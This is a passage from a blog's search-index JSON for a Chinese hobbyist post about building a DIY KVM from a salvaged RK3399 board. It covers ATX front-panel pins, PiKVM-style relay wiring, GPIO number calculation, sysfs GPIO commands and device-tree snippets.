\u5f15\u811a","text":"<p>\u53f0\u5f0f\u673a\u7684\u5f00\u5173\u673a\uff0c\u662f\u7531\u4e3b\u677f\u4e0a\u7684\u4e00\u7ec4\u5f15\u811a\u63a7\u5236\u7684\u3002\u4e3b\u677f\u624b\u518c\u4e2d\u4f1a\u628a\u8fd9\u4e9b\u5f15\u811a\u53eb\u505a\u524d\u9762\u677f\u5f15\u811a\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u5f15\u811a\u7528\u4e8e\u8fde\u63a5\u673a\u7bb1\u524d\u9762\u677f\u7684\u4e00\u4e9b I/O\u3002\u8fd9\u4e9b\u5f15\u811a\uff0c\u901a\u5e38\u6709 4 \u7ec4\u3002\u5176\u4e2d PWR \u548c RST \u7528\u4e8e\u63a7\u5236\u5f00\u5173\u673a\u548c Reset\u3002\u800c PWR LED \u548c HDD LED \u7528\u4e8e\u5728\u524d\u9762\u677f\u663e\u793a\u5f00\u673a\u72b6\u6001\u548c\u786c\u76d8\u6d3b\u52a8\u72b6\u6001\u3002</p> <p>\u534e\u7855 b550 \u91cd\u70ae\u624b\u4e3b\u677f\u624b\u518c\u5185\u5bb9\u5982\u4e0b\u3002<code>#</code> \u8868\u793a\u4f4e\u7535\u5e73\u6709\u6548\u3002 </p> <p>\u8fd9\u662f\u534e\u7855 ROG Strix X570 \u7684\u624b\u518c\u5185\u5bb9 </p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#pi-kvm-\u7684\u65b9\u6848","title":"Pi KVM \u7684\u65b9\u6848","text":"<p>Pi KVM \u7684\u65b9\u6848\uff1aATX control board - PiKVM Handbook</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u8fde\u7ebf","title":"\u8fde\u7ebf","text":"<p>Pi KVM \u65b9\u6848\u7684\u539f\u7406\u5c31\u662f~~\u901a\u8fc7 GPIO \u63a7\u5236 ATX PWR \u7b49\u5f15\u811a~~\uff0c\u901a\u8fc7 GPIO \u63a7\u5236\u5149\u8026\u7ee7\u7535\u5668\u5f00\u5173\uff0c\u77ed\u63a5 PWR \u5f15\u811a\uff08\u7535\u6e90\u952e\u6309\u4e0b\u4e5f\u662f\u77ed\u63a5 PWR \u5f15\u811a\uff09\u3002\u7279\u70b9\u662f\u8fde\u7ebf\u65b9\u5f0f\u505a\u4e86\u4f18\u5316\u3002</p> <ul> <li>\u9996\u5148\uff0cPIKVM \u6709\u4e00\u4e2a\u677f\u5b50\u7528\u4e8e\u5c06 atx \u63a7\u5236\u7ebf\u8f6c\u6210 RJ45\u3002\u677f\u5b50\u53ef\u4ee5 3d \u6253\u5370\u4e00\u4e2a pcie slot \u652f\u67b6\u3002\u8fd9\u6837\uff0cATX \u63a7\u5236\u7ebf\u5c31\u53ef\u4ee5\u901a\u8fc7 pcie slot \u66b4\u9732\u5230\u673a\u7bb1\u5916\u4e86\u3002</li> </ul> <p></p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#gpio-\u63a7\u5236","title":"GPIO \u63a7\u5236","text":"<p>GPIO (pins, relays, lamps, etc) - PiKVM Handbook</p> <p>Pi KVM \u81ea\u5df1\u5b9e\u73b0\u4e86\u4e00\u5957\u5bf9 GPIO \u7684\u63a7\u5236\u65b9\u6cd5\uff0c\u4f7f\u7528 yaml \u914d\u7f6e\u6587\u4ef6\u914d\u7f6e\u3002\u62bd\u8c61\u4e86\u4e00\u4e9b\u9ad8\u7ea7\u884c\u4e3a\uff0c\u8fd9\u6837\u5c31\u4e0d\u7528\u81ea\u5df1\u53bb\u76f4\u63a5\u64cd\u4f5c GPIO \u9a71\u52a8\u4e86\u3002\u6bd4\u5982\u53ef\u4ee5\u914d\u7f6e pulse \u6a21\u5f0f\uff0cdelay \u65f6\u95f4\u7b49\u3002</p> <p>\u4f7f\u7528 Pi KVM \u7684\u65b9\u6cd5\uff0c\u751a\u81f3\u8fd8\u53ef\u4ee5\u914d\u7f6e Web \u4e2d\u663e\u793a\u7684\u6837\u5f0f\u3002\u5b9e\u73b0\u81ea\u5b9a\u4e49\u7684\u6309\u94ae\u7b49\u3002 </p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#nanokvm","title":"nanoKVM","text":"<p>\u5176\u5b9e\u9664\u4e86\u50cf PiKVM \u4f7f\u7528 RJ45 \u5f15\u51fa GPIO\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 usb \u5f15\u51fa GPIO\uff0c\u6bd5\u7adf\u53ea\u662f\u5f15\u811a\u3002</p> <p>\u4e3b\u677f GPIO \u8f6c usb </p> <p>usb \u63a5\u5149\u8026\u7ee7\u7535\u5668\u63a5 ATX PWR \u5f15\u811a </p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#sbc-diy-\u65b9\u6848","title":"SBC DIY \u65b9\u6848","text":"<p>\u81ea\u5df1\u4f7f\u7528\u666e\u901a\u5355\u677f\u8ba1\u7b97\u673a DIY \u6709\u4e24\u79cd\u65b9\u6848</p> <ul> <li>SBC \u7684 GPIO \u76f4\u63a5\u8fde\u63a5 ATX \u5f15\u811a</li> <li>\u5f15\u5165\u4e00\u4e2a\u7ee7\u7535\u5668\uff0c\u7ee7\u7535\u5668\u8fde\u63a5\u53f0\u5f0f\u673a\u5f00\u673a\u952e\u3002SBC \u63a7\u5236\u7ee7\u7535\u5668\u7684\u5f00\u548c\u5173\u3002</li> </ul> <p>\u4e0d\u540c\u4e3b\u677f\u5f15\u811a\u7535\u538b\u5b9a\u4e49\u53ef\u80fd\u4e0d\u540c\uff0c\u7b2c\u4e00\u79cd\u65b9\u6848\u5b58\u5728\u4e00\u5b9a\u95ee\u9898\u3002</p> <p>UPDATE(2024-07-17)\uff1a\u6211\u53d1\u73b0\u6709\u4e00\u4e2a\u8bef\u89e3\uff0c\u4ee5\u4e3a\u8fd9\u91cc\u7684 PWR+,- \u9700\u8981\u4ea7\u751f\u9ad8/\u4f4e\u7535\u5e73\u4fe1\u53f7\u624d\u884c\u3002\u5176\u5b9e\u8fd9\u91cc\u4e24\u4e2a\u5f15\u811a\u77ed\u63a5\u5c31\u80fd\u89e6\u53d1\u3002\u8fd9\u91cc\u8ba8\u8bba\u7684 GPIO \u76f4\u8fde\u65b9\u6848\uff0c\u5176\u5b9e\u662f\u56e0\u4e3a\u77ed\u63a5\u7684\u6548\u679c\u662f\u8ba9\u4e00\u8fb9\u53d8\u4e3a GND\uff08\u5047\u8bbe\u4e24\u6839\u5f15\u811a PWR, GND \u5e03\u5c40\uff09\uff0c\u6240\u4ee5 GPIO \u5c06\u5176\u62c9\u4f4e\u80fd\u8d77\u5230\u4e00\u6837\u7684\u6548\u679c\u3002GPIO \u76f4\u8fde\u65b9\u6848\u7684\u6709\u70b9\u53ef\u80fd\u5728\u4e8e\u7701\u4e86\u4e00\u4e2a\u7ee7\u7535\u5668\uff082-3 \u5143\uff09\u3002</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#tg-\u5bf9\u8bdd\u8bb0\u5f55","title":"Tg \u5bf9\u8bdd\u8bb0\u5f55","text":"<p>\u8bf7\u6559\u4e0b\u9700\u8981\u4e70\u4ec0\u4e48\u7ebf\u8fde\u63a5\u5462\uff1fgpio \u548c ATX \u5f15\u811a\u95f4\u9700\u8981\u7ee7\u7535\u5668\u5417\uff1f\u6709\u6ca1\u6709\u535a\u5ba2\u6559\u7a0b\uff1f \u8ddfatx\u6ca1\u5173\u7cfb \u76f4\u63a5\u8fde\u5230\u5f00\u673a\u952e\u524d\u9762\u677f\u8fde\u63a5\u5668\u4e0a</p> <p>\u6211\u89c9\u5f97\u4f60\u5171\u5730\u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u53bb\u62c9\u4e3b\u677f\u7684\u7535\u5e73\u4e86\uff08 \u554a\uff0c\u90a3\u79cd\u6a21\u5757\u4e5f\u884c \u4e0d\u8fc7\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u53bb\u62c9\u7535\u5e73\u5462</p> <p>\u56e0\u4e3a\u4f60\u4e0d\u77e5\u9053\u8be5\u62c9\u54ea\u6839\u7ebf\uff0c\u62c9\u9ad8\u8fd8\u662f\u62c9\u4f4e\uff0c\u62c9\u9519\u4e86\u8fd8\u53ef\u80fd\u77ed\u8def</p> <p>\u6893\u7476 | struct virt_dma_chan *, [2024/6/29 2:44] \u80af\u5b9a\u662f\u62c9 PWR_BUT# \u554a\uff0cATX \u90a3\u8fb9\u7684\u5f15\u811a\u65e2\u7136\u60ac\u7a7a\u72b6\u6001\u4e5f\u7a33\u5b9a\u5e76\u4e14\u4f4e\u7535\u5e73\u6709\u6548\u80af\u5b9a\u6709\u5185\u90e8\u4e0a\u62c9\uff0c\u5916\u90e8\u53ea\u9700\u8981\u624b\u52a8\u62c9\u4f4e\u6389\u5c31\u53ef\u4ee5\u4e86\uff08</p> <p>t, [2024/6/29 2:46] ATX\u90a3\u8fb9\u5f15\u811a \u4f60\u62c9\u4e86\u4e5f\u4e0d\u4e00\u5b9a\u5f00\u673a</p> <p>t, [2024/6/29 2:46] \u6700\u597d\u7684\u529e\u6cd5\u8fd8\u662f\u63a7\u5236\u7535\u6e90\u6309\u94ae</p> <p>t, [2024/6/29 2:46] \u50cf\u8fd9\u79cdPW+ PW-</p> <p>t, [2024/6/29 2:46] \u4f60\u600e\u4e48\u77e5\u9053\u62c9\u54ea\u4e00\u4e2a</p> <p>\u6893\u7476 | struct virt_dma_chan *, [2024/6/29 2:47] \u5bf9\u5730\u6d4b\u4e00\u4e0b\u7535\u538b\u5c31\u597d\u4e86\u554a\uff08</p> <p>t, [2024/6/29 2:47] \u4e00\u4e2a3.3\uff0c\u4e00\u4e2a0\uff0c\u4f60\u62c9\u54ea\u4e2a\uff1f</p> <p>t, [2024/6/29 2:48] \u4e07\u4e003.3\u90a3\u4e2a\u662fVCC\uff0c0\u90a3\u4e2a\u624d\u662f\u5b9e\u9645\u63a7\u5236\u7684\uff1f</p> <p>t, [2024/6/29 2:48] \u4f60\u6839\u672c\u4e0d\u77e5\u9053</p> <p>\u597d\u5427\uff08 \u6211\u4e00\u76f4\u57fa\u4e8e\u4e00\u4e2a\u662f PWR# \u4e00\u4e2a\u662f GND \u7684\u677f\u5b50\u5728\u601d\u8003\uff08\u6211\u53ea\u9047\u5230\u8fc7\u8fd9\u6837\u7684</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#king3399-gpio-\u63a7\u5236","title":"King3399 GPIO \u63a7\u5236","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u8d44\u6599\u624b\u518c","title":"\u8d44\u6599\u624b\u518c","text":"<p>\u9700\u8981\u4ec0\u4e48\u8d44\u6599\u624b\u518c</p> <ul> <li>King3399\u5e95\u677f-\u786c\u4ef6\u89c4\u683c\u4e66_20180105.pdf<ul> <li>\u5305\u542b\u4e86\u677f\u5b50\u63a5\u53e3\uff0c\u5bf9\u5e94\u7684\u5f15\u811a\u5b9a\u4e49\u3002<ul> <li>\u6bd4\u5982\u53ef\u4ee5\u77e5\u9053\u677f\u5b50\u4e0a\u67d0\u4e2a\u5f15\u811a\u4e3a GPIO \u5f15\u811a\uff0c\u5b9a\u4e49\u4e3a IO4_C5\u3002\u901a\u8fc7\u8ba1\u7b97\u5f97\u5230\u5bf9\u5e94\u7684\u7f16\u53f7\uff0c\u4ece\u800c\u5728 linux \u4e2d\u8fdb\u884c\u63a7\u5236\u3002</li> </ul> </li> </ul> </li> <li>KING3399-20180712\u539f\u7406\u56fe.pdf<ul> <li>\u5305\u542b\u4e86\u6240\u6709\u7684\u7535\u8def\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u4e0a\u9762\u7684\u5f15\u811a\u600e\u4e48\u770b\uff0c\u600e\u4e48\u548c\u5b9e\u9645\u677f\u5b50\u5bf9\u5e94\u8d77\u6765\u3002</li> </ul> </li> </ul> <p>Rockchip RK3399 datasheet\uff0c\u663e\u793a\u4e86 SoC \u5305\u542b\u7684 GPIO \u8d44\u6e90\u3002</p> <p>GPIO</p> <ul> <li>5 groups of GPIO (GPIO0~GPIO4), totally have 122 GPIOs</li> <li>All of GPIOs can be used to generate interrupt to CPU</li> <li>GPIO0 and GPIO1 can be used to wakeup system from low-power mode</li> <li>The pull direction (pull-up or pull-down) for all of GPIOs are software programmable</li> <li>All of GPIOs are always in input direction in default after power-on-reset</li> <li>The drive strength for all of GPIOs is software-programmable</li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u4e24\u79cd\u63a7\u5236-gpio-\u7684\u65b9\u5f0f","title":"\u4e24\u79cd\u63a7\u5236 gpio \u7684\u65b9\u5f0f","text":"","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u91cd\u65b0\u7f16\u8bd1\u955c\u50cf\u65b9\u5f0f","title":"\u91cd\u65b0\u7f16\u8bd1\u955c\u50cf\u65b9\u5f0f","text":"<p>\u4e3a\u4e86\u65b9\u4fbf\u5ba2\u6237\u4f7f\u7528gpio\uff0c\u6211\u4eec\u505a\u4e86\u4e00\u4e2a\u9a71\u52a8\u5bfc\u51fa\u4e86gpio\u63a7\u5236\u8282\u70b9\u4f9b\u7528\u6237\u63a7\u5236gpio\u7684\u72b6\u6001</p> <ul> <li>\u9002\u7528\u5e73\u53f0\uff1a\u652f\u6301\u8363\u54c1\u5927\u90e8\u5206\u5e73\u53f0</li> <li>\u9002\u7528\u5bf9\u8c61\uff1a\u6709\u80fd\u529b\u4fee\u6539\u7f16\u8bd1\u6e90\u7801</li> <li>\u91cd\u65b0\u7f16\u8bd1\u6e90\u7801\uff0c\u70e7\u5f55\u955c\u50cf\u540e\uff0c\u65b9\u624d\u751f\u6548</li> </ul> <ul> <li>\u6253\u5f00\u4e3b\u8bbe\u5907\u6811\u6587\u4ef6\uff0c\u5982rp-rk3399\uff1a<code>kernel/arch/arm/boot/dts/rp3399-linux.dts</code></li> <li> <p>\u627e\u5230 rp_gpio \u8282\u70b9\u6dfb\u52a0\u914d\u7f6e</p> <ul> <li>\u793a\u4f8b\uff1a\u914d\u7f6eGPIO5_C0\u529f\u80fd\u8f93\u51fa\u529f\u80fd</li> </ul> <pre><code>rp_gpio{\n    status = \"okay\";\n    compatible = \"rp_gpio\";\n    gpio5c0 { //\u7f16\u8bd1\u70e7\u5f55\u540e\u4e0e\u677f\u5b50\u4e0a /proc/rp_gpio/\u76ee\u5f55\u4e0b\u8282\u70b9\u540d\u79f0\u4e00\u81f4\n        gpio_num = &lt;&amp;gpio5 RK_PC0 GPIO_ACTIVE_HIGH&gt;;\n        gpio_function = &lt;0&gt;;\n    };\n};\n</code></pre> </li> </ul> <ul> <li>\u5f00\u53d1\u677f\u4e0a\u63a7\u5236\u914d\u7f6e\u597d\u7684gpio\uff1a</li> </ul> <pre><code>  cat /proc/rp_gpio/gpio1b7 # \u8bfb\u53d6\n  echo 1 &gt; /proc/rp_gpio/gpio1b7 # \u62c9\u9ad8\n  echo 0 &gt; /proc/rp_gpio/gpio1b7 # \u62c9\u4f4e\n</code></pre> <p>\u66f4\u8be6\u7ec6\u7684\u914d\u7f6e\u548c\u4f7f\u7528\u8bf4\u660e\u8bf7\u67e5\u770b\u7f51\u76d8\uff1a 02-\u8f6f\u4ef6\u6587\u6863/\u8363\u54c1\u6587\u6863/\u9a71\u52a8\u8c03\u8bd5/GPIO</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u63a7\u5236\u4efb\u610f-gpio","title":"\u63a7\u5236\u4efb\u610f GPIO","text":"<p>\u9002\u7528\u5e73\u53f0\uff1a\u4efb\u4f55\u652f\u6301 gpiolib \u7684\u5e73\u53f0 \u9002\u7528\u5bf9\u8c61\uff1a\u4e0d\u60f3\u7f16\u8bd1SDK\u7684\u60c5\u51b5\u4e0b\uff0c\u4ea6\u53ef\u63a7\u5236GPIO</p> <p>GPIO \u7f16\u53f7\u8ba1\u7b97</p> <p>GPIO\u7f16\u53f7 = BANK 32 + GPIO_PIN <code>GPIO&lt;N&gt;_&lt;M&gt;&lt;P&gt;</code> = N 32 + 8 * (M -1) + P</p> <p>\u793a\u4f8b\uff1a</p> <ul> <li>GPIO7_C2 = 7 X 32 + 8 X (3-1) + 2 = 242</li> <li>GPIO2_A1 = 2 X 32 + 8 X (1-1) + 1 = 73</li> </ul> <p>A\u5bf9\u5e941\uff0cB\u5bf9\u5e942\uff0cC\u5bf9\u5e943\uff0c\u4ee5\u6b64\u7c7b\u63a8</p> <p>\u6ce8\u610f\u4e8b\u9879</p> <p>1\u3001\u901a\u8fc7\u539f\u7406\u56fe\u8c28\u614e\u786e\u8ba4\u5bf9\u5e94GPIO\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u82e5\u64cd\u4f5c\u4e0d\u5f53\uff0c\u4f1a\u9020\u6210\u4e25\u91cd\u540e\u679c 2\u3001\u5e76\u975e\u6240\u6709GPIO\u90fd\u80fd\u63a7\u5236\uff0c\u82e5\u64cd\u4f5c\u5931\u8d25\uff0c\u8bf7\u66f4\u6362GPIO\u5c1d\u8bd5 3\u3001\u7cfb\u7edf\u91cd\u542f\u540e\u9700\u8981\u91cd\u65b0\u5bfc\u51faGPIO\u3001\u8bbe\u7f6e\u6a21\u5f0f</p> <p>\u793a\u4f8b\uff1a\u8bbe\u7f6eGPIO2_D1\u4e3a\u9ad8\u7535\u5e73</p> <ul> <li>\u5bfc\u51faGPIO2_D1\u5f15\u811a</li> <li>echo 89 &gt; /sys/class/gpio/export</li> <li>\u5bfc\u51fa\u6210\u529f\u540e\uff0c\u4f1a\u751f\u6210/sys/class/gpio/gpio89\u76ee\u5f55</li> <li>\u82e5\u6ca1\u6709\u751f\u6210\uff0c\u8bf4\u660e\u8be5\u5f15\u811a\u4e0d\u53ef\u5bfc\u51fa</li> <li>\u8bbe\u7f6eGPIO2_D1\u5f15\u811a\u4e3a\u8f93\u51fa\u6a21\u5f0f</li> <li>echo out &gt; /sys/class/gpio/gpio89/direction</li> <li>\u8bbe\u7f6eGPIO2_D1\u5f15\u811a\u9ad8\u7535\u5e73</li> <li>echo 1 &gt; /sys/class/gpio/gpio89/value</li> </ul> <p>\u793a\u4f8b\uff1a\u8bfb\u53d6GPIO7_C2\u7535\u5e73</p> <ul> <li>\u5bfc\u51faGPIO7_C2\u5f15\u811a</li> <li>echo 242 &gt; /sys/class/gpio/export</li> <li>\u8bbe\u7f6eGPIO7_C2\u5f15\u811a\u4e3a\u8f93\u51fa\u6a21\u5f0f</li> <li>echo in &gt; /sys/class/gpio/gpio242/direction</li> <li>\u8bbe\u7f6eGPIO7_C2\u5f15\u811a\u9ad8\u7535\u5e73</li> <li>cat /sys/class/gpio/gpio242/value</li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u67e5\u770b-gpio-\u65b9\u5f0fchatgpt","title":"\u67e5\u770b GPIO \u65b9\u5f0f\uff08ChatGPT\uff09","text":"<p>\u5d4c\u5165\u5f0f\u5f00\u53d1\u677f\uff0c\u5982\u4f55\u67e5\u770b\u5f53\u524d\u7684\u6240\u6709 GPIO</p> <ul> <li>\u4f7f\u7528 <code>/sys/class/gpio</code> \u6587\u4ef6\u7cfb\u7edf<ul> <li>\u67e5\u770b\u5df2\u5bfc\u51fa\u7684 GPIO \u5f15\u811a\uff0c\u5982 <code>gpio503</code></li> <li>\u67e5\u770b\u53ef\u7528\u7684 GPIO \u82af\u7247\uff0c\u5982 <code>gpiochip0</code>, <code>gpiochip1</code> \u7b49\u3002\u67e5\u770b\u8fd9\u4e9b\u76ee\u5f55\u53ef\u4ee5\u4e86\u89e3\u6bcf\u4e2a\u82af\u7247\u4e0a\u7684 GPIO \u5f15\u811a\u8303\u56f4\u3002</li> </ul> </li> <li>\u4f7f\u7528 <code>gpioinfo</code> \u547d\u4ee4<ul> <li>\u5982\u679c\u7cfb\u7edf\u4e0a\u5b89\u88c5\u4e86 <code>libgpiod</code> \u5de5\u5177\u96c6\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>gpioinfo</code> \u547d\u4ee4\u6765\u67e5\u770b\u6240\u6709 GPIO \u5f15\u811a\u7684\u4fe1\u606f\u3002<code>libgpiod</code> \u662f\u4e00\u4e2a\u65b0\u7684 GPIO \u63a7\u5236\u5e93\u548c\u5de5\u5177\u96c6\uff0c\u65e8\u5728\u66ff\u4ee3 <code>/sys/class/gpio</code> \u63a5\u53e3\u3002<ul> <li>apt-get install gpiod</li> </ul> </li> </ul> </li> <li>\u67e5\u770b\u8bbe\u5907\u6811\uff08Device Tree\uff09<ul> <li>\u5728\u4e00\u4e9b\u5d4c\u5165\u5f0f\u7cfb\u7edf\u4e2d\uff0cGPIO \u5f15\u811a\u914d\u7f6e\u5728\u8bbe\u5907\u6811\u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u67e5\u770b\u8bbe\u5907\u6811\u6765\u4e86\u89e3 GPIO \u5f15\u811a\u7684\u4fe1\u606f\u3002</li> <li>\u8bbe\u5907\u6811\u6587\u4ef6\u901a\u5e38\u4f4d\u4e8e <code>/boot/</code> \u76ee\u5f55\u6216 <code>/proc/device-tree/</code> \u76ee\u5f55\u4e2d</li> <li>\u8bbe\u5907\u6811\u6587\u4ef6\u901a\u5e38\u662f\u4e8c\u8fdb\u5236\u683c\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>dtc</code>\uff08\u8bbe\u5907\u6811\u7f16\u8bd1\u5668\uff09\u6765\u89e3\u7801\u4e3a\u4eba\u7c7b\u53ef\u8bfb\u7684\u683c\u5f0f\u3002\u4f8b\u5982\uff1a<code>dtc -I dtb -O dts -o devicetree.dts /path/to/device-tree-file.dtb</code></li> </ul> </li> <li>\u67e5\u770b\u5f00\u53d1\u677f\u7684\u6587\u6863\u548c\u624b\u518c</li> </ul>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#\u5b9e\u8df5","title":"\u5b9e\u8df5","text":"<p>\u67e5\u770b\u5e95\u677f\u89c4\u683c\u4e66\u3002\u53d1\u73b0\u6807\u53f7 18 \u7684\u63a5\u53e3\u4e2d\uff08\u4f4d\u4e8e\u6392\u9488\u4e2d\u4e00\u6bb5\uff09\uff0c\u6709\u51e0\u4e2a GPIO \u5f15\u811a\u3002</p> <p>\u4e0d\u6e05\u695a\u5b83\u7684\u811a\u4f4d\u662f\u600e\u4e48\u6570\u7684\u3002\u4e0d\u8fc7\u677f\u5b50\u4e0a\u4e5f\u6709\u6587\u5b57\uff0c\u4ece\u6587\u5b57\u548c\u5b9a\u4e49\u53ef\u4ee5\u770b\u51fa\u987a\u5e8f\u3002</p> \u811a\u4f4d \u5b9a\u4e49 \u5f53\u524d IO \u72b6\u6001 IO \u7535\u538b \u529f\u80fd\u4e00 41 SCL1 \u8f93\u51fa 1V8 42 SDA1 \u8f93\u5165\u8f93\u51fa 1v8 43 ADC0 \u8f93\u5165 1V8 44 IO4_C5 \u8f93\u5165\u8f93\u51fa 3v GPIO 45 IO4_D0 \u8f93\u5165\u8f93\u51fa 3v GPIO 46 GND \u63a5\u5730 0v 47 IO4_D5 \u8f93\u5165\u8f93\u51fa 3v GPIO 48 IO4_D1 \u8f93\u5165\u8f93\u51fa 3v GPIO 49 NC NC 0v 50 GND \u63a5\u5730 0v <p></p> <p>\u5c06 led \u4e00\u7aef\u63a5\u5728\u677f\u5b50\u7684 GND\uff0c\u4e00\u7aef\u63a5\u5728\u4e0a\u9762 4 \u4e2a GPIO \u4e2d\uff0c\u53d1\u73b0\u63a5\u5728 pin45 IO4_D0 \u4e0a\u65f6\uff0c\u4f1a\u548c\u677f\u5b50\u4e0a\u7684\u4e00\u4e2a\u7ea2\u8272 led \u706f\u540c\u6b65\u95ea\u70c1\u3002</p> <p>\u4e4b\u524d\u4e5f\u4f7f\u7528\u4e86 gpioinfo \u67e5\u770b\u4e86\u6240\u6709 GPIO \u4fe1\u606f\u3002\u53ef\u4ee5\u731c\u6d4b\uff0cIO4_D0 \u5bf9\u5e94 gpiochip4 line 24 \u7684 breathe_led</p> <pre><code>gpiochip4 - 32 lines:\n        line   0:      unnamed       unused   input  active-high\n        line   1:      unnamed       unused   input  active-high\n        line   2:      unnamed       unused   input  active-high\n        line   3:      unnamed       unused   input  active-high\n        line   4:      unnamed       unused   input  active-high\n        line   5:      unnamed       unused   input  active-high\n        line   6:      unnamed       unused   input  active-high\n        line   7:      unnamed       unused   input  active-high\n        line   8:      unnamed       unused   input  active-high\n        line   9:      unnamed       unused   input  active-high\n        line  10:      unnamed       unused   input  active-high\n        line  11:      unnamed       unused   input  active-high\n        line  12:      unnamed       unused   input  active-high\n        line  13:      unnamed       unused   input  active-high\n        line  14:      unnamed       unused   input  active-high\n        line  15:      unnamed       unused   input  active-high\n        line  16:      unnamed       unused   input  active-high\n        line  17:      unnamed       unused   input  active-high\n        line  18:      unnamed       unused   input  active-high\n        line  19:      unnamed       unused   input  active-high\n        line  20:      unnamed       unused   input  active-high\n        line  21:      unnamed       unused   input  active-high\n        line  22:      unnamed \"vcc3v3-gsm\"  output  active-high [used]\n        line  23:      unnamed       unused   input  active-high\n        line  24:      unnamed \"breathe_led\" output active-low [used]\n        line  25:      unnamed       unused   input  active-high\n        line  26:      unnamed \"vbus-typec-regulator\" output active-high [used]\n        line  27:      unnamed       unused  output  active-high\n        line  28:      unnamed       unused   input  active-high\n        line  29:      unnamed       unused   input  active-high\n        line  30:      unnamed \"vcc5v0-host-regulator\" output active-high [used]\n        line  31:      unnamed       unused   input  active-high\n</code></pre> <p>\u7531\u6b64\uff0c\u53ef\u4ee5\u53d1\u73b0\u5269\u4f59 3 \u4e2a gpio \u90fd\u662f unused\u3002\u901a\u8fc7\u524d\u9762\u7684\u8ba1\u7b97\u7f16\u53f7\u7684\u65b9\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528\u5269\u4f59 3 \u4e2a GPIO</p> <p>io4_c5 = 21 = 149 io4_d0 = 24 io4_d5 = 29 = 157 io4_d1 = 25 = 153</p>","tags":["KVM","rk3399","armbian","\u8bbe\u5907"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2023/07/23/2023-07-23-%E6%8D%A1%E5%9E%83%E5%9C%BE-rk3399%20DIY%20KVM/#dts","title":"dts","text":"<p>\u672c\u6765\u8fd8\u60f3\u901a\u8fc7\u4fee\u6539 dts \u6587\u4ef6\u7684\u65b9\u5f0f\u4f7f\u7528 GPIO\uff0c\u6700\u540e\u53d1\u73b0\u5e76\u4e0d\u80fd\u7528\u3002\u53ef\u80fd rp_gpio \u9a71\u52a8\u6ca1\u6709\u96c6\u6210\uff0c\u9700\u8981\u81ea\u5df1\u91cd\u65b0\u7f16\u8bd1\u7cfb\u7edf\u3002</p> <p>breathe_led \u7684 dts \u914d\u7f6e</p> <pre><code>leds {\n                compatible = \"gpio-leds\";\n                pinctrl-names = \"default\";\n                pinctrl-0 = &lt;0xde&gt;;\n\n                led-breathe-led {\n                        label = \"breathe_led\";\n                        linux,default-trigger = \"heartbeat\";\n                        default-state = \"off\";\n                        gpios = &lt;0xd4 0x18 0x01&gt;;\n                        phandle = &lt;0x173&gt;;\n                };\n        };\n</code></pre> <p>\u5176\u4e2d 0xd4 